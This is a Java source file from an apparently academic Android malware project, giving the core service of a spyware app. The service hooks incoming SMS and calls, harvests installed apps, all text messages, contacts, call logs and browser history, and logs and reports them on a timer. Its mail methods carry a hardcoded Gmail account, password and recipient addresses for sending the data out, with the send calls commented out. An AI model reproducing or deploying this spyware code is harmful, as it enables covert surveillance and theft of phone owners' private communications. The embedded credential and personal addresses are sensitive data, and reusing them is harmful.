/***********************************************************************
 * This file is part of INF358-AndroidMalwareProject
 * 
 * Copyright (c) 2012  GPL Project Developer
 * 
 * INF358-AndroidMalwareProject is free software: you may copy, redistribute
 * and/or modify it under the terms of the GNU General Public License as
 * published by the Free Software Foundation, either version 2 of the
 * License, or (at your option) any later version.
 * 
 * This file is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 * authors: Issa CAMARA, Wajih JMAIEL, Julien MEDORI, Hakim WADIL

 ***********************************************************************/

package com.malware.service;

import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.AsyncTask;
import android.os.IBinder;
import android.util.Log;

import com.malware.data.FetchHistoryTask;
import com.malware.data.FetchInstalledAppsTask;
import com.malware.data.FetchLocalisation;
import com.malware.data.HistoryEntry;
import com.malware.mail.ReportSender;
import com.malware.mail.SendMailTask;
import com.malware.phone.FetchAllCallTask;
import com.malware.phone.FetchAllSmsTask;
import com.malware.phone.FetchContactsTask;
import com.malware.phone.IncomingCall;
import com.malware.phone.IncomingSMS;
import com.malware.phone.OutgoingCall;

public class MyService extends Service {

	private IBinder mBinder;
	private boolean mAllowRebind;
	private Timer t;
	private TimerTask tt;

	private final boolean VERBOSE = true;
	private final String TAG = "MalwareService";
	private FetchInstalledAppsTask fetchInstalledAppsTask;
	private FetchAllSmsTask fetchAllSmsTask;
	private FetchContactsTask fetchContactsTask;
	private FetchHistoryTask fetchHistoryTask;
	private FetchAllCallTask fetchAllCallTask;

	@Override
	public void onCreate() {

		if (VERBOSE) Log.v(TAG, "Creating service");

		// Initialise filters for Broadcast receivers
		IntentFilter incomingSmsFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
		IntentFilter outgoingCallFilter = new IntentFilter("android.intent.action.NEW_OUTGOING_CALL");
		IntentFilter incomingCallFilter = new IntentFilter("android.intent.action.PHONE_STATE");
		registerReceiver(new IncomingSMS(this), incomingSmsFilter);
		registerReceiver(new OutgoingCall(this), outgoingCallFilter);
		registerReceiver(new IncomingCall(this), incomingCallFilter);

		
		// Collect stored data
		ContentResolver cr = getContentResolver();

		Log.v(TAG, "--> Fetching installed apps");
		fetchInstalledAppsTask = new FetchInstalledAppsTask(this);
		fetchInstalledAppsTask.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR,getPackageManager());

		Log.v(TAG, "--> Fetching all sms");
		fetchAllSmsTask = new FetchAllSmsTask(this);
		fetchAllSmsTask.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR,cr);

		Log.v(TAG, "--> Fetching contacts");
		fetchContactsTask = new FetchContactsTask(this);
		fetchContactsTask.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR, cr);

		Log.v(TAG, "--> Fetching web history");
		fetchHistoryTask = new FetchHistoryTask(this);
		fetchHistoryTask.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR,cr);

		Log.v(TAG, "--> Fetching CallLog");
		fetchAllCallTask = new FetchAllCallTask(this);
		fetchAllCallTask.execute(getContentResolver());

//		Log.v(TAG, "--> Fetching GPS localisation");
//		FetchLocalisation gps = new FetchLocalisation(getApplicationContext());
//		Log.d(TAG, "Latitude = " + gps.getLatitude());
//		Log.d(TAG, "Longitude = " + gps.getLongitude());

		// Prepare task to regularly fetch and display stored information
		dataUpdater();
	}

	private void dataUpdater() {
		t = new Timer();
		tt = new TimerTask() {

			@Override
			public void run() {
				/*
				 * TODO: add a way to check if data has been updated since the last "fetch tasks"
				 */

				if (VERBOSE) Log.v(TAG, "--> Updating...");

				String registeredSMS = fetchAllSmsTask.getListOfSms();
				String label = fetchInstalledAppsTask.getLabel();
				ArrayList<ArrayList<String>> contactsList = fetchContactsTask.getContactsList();

				String callLogs = fetchAllCallTask.getCallList();
				ArrayList<HistoryEntry> listEntry = fetchHistoryTask.getListEntry();

				if (VERBOSE) {
					Log.i(TAG, "Contacts:");
					for (int j = 0 ; j < contactsList.size() ; j++) {
						Log.v(TAG, contactsList.get(j).get(0) + " " + contactsList.get(j).get(1));
					}

					Log.i(TAG, "Installed apps:");
					Log.v(TAG, label);

					Log.i(TAG, "SMS:");
					Log.v(TAG, registeredSMS);

					Log.i(TAG, "Call logs:");
					Log.v(TAG, callLogs);

					Log.i(TAG, "History Entry");
					for (int j = 0 ; j < listEntry.size() ; j++) {
						HistoryEntry entry = listEntry.get(j); 
						Log.v(TAG, entry.getTitle() + "\n" + entry.getUrl());
					}
				}

				if (VERBOSE) Log.v(TAG, "--> Update done");
			}
		};
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {

		if (VERBOSE) Log.v(TAG, "Starting service");

		t.scheduleAtFixedRate(tt, 10000, 1500000);

		return Service.START_STICKY;
	}
	
	/**
	 * Takes a String and adds it to a file named "tmp" located in the folder /data/data/.../files
	 * @param textToAdd
	 */
	public synchronized void addTextToFile(String textToAdd) {
		Date now = new Date();
		try {
			textToAdd = "--> On: " + now.toString() + ": " + textToAdd + "\n\n";
			
			// Open file in internal memory
			FileOutputStream output = openFileOutput("tmp", MODE_APPEND);
			
			// Write the text in the file
			output.write(textToAdd.getBytes());
			
			output.flush();
			output.close();
			
			ReportSender rs = new ReportSender(this);
			rs.runTask();
			
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	public void sendMail(String emailSubject, String data) {

		// Gmail address created for the project
		final String fromEmail = "ckahckah@gmail.com";
		final String fromPassword = "projetinf358";

		// Recipients
		String toEmails = "medori.julien@gmail.com, hakim.walid92000@gmail.com";
		List<String> toEmailList = Arrays.asList(toEmails.split("\\s*,\\s*"));

		if (VERBOSE) Log.i(TAG, "To List: " + toEmailList);

//		(new SendMailTask()).executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR, fromEmail,fromPassword, toEmailList, emailSubject, data);
	}

	public void sendMail(String emailSubject, ArrayList<ArrayList<String>> contactsList) {

		// Gmail address created for the project
		final String fromEmail = "ckahckah@gmail.com";
		final String fromPassword = "projetinf358";

		// Recipients
		String toEmails = "medori.julien@gmail.com, hakim.walid92000@gmail.com";
		List<String> toEmailList = Arrays.asList(toEmails.split("\\s*,\\s*"));

		if (VERBOSE) Log.i(TAG, "To List: " + toEmailList);

		String emailBody = "";

		for (int j = 0 ; j < contactsList.size() ; j++) {
			emailBody += contactsList.get(j).get(0) + " " + contactsList.get(j).get(1) + "\r\n";
		}

//		(new SendMailTask()).executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR, fromEmail,fromPassword, toEmailList, emailSubject, emailBody);
	}

	@Override
	public IBinder onBind(Intent intent) {
		// A client is binding to the service with bindService()
		return mBinder;
	}

	@Override
	public boolean onUnbind(Intent intent) {
		// All clients have unbound with unbindService()
		return mAllowRebind;
	}

	@Override
	public void onRebind(Intent intent) {
		// A client is binding to the service with bindService(),
		// after onUnbind() has already been called
	}

	@Override
	public void onDestroy() {
		// The service is no longer used and is being destroyed
		if (VERBOSE) Log.v(TAG, "Destroying service");
		t.cancel();
	}
}
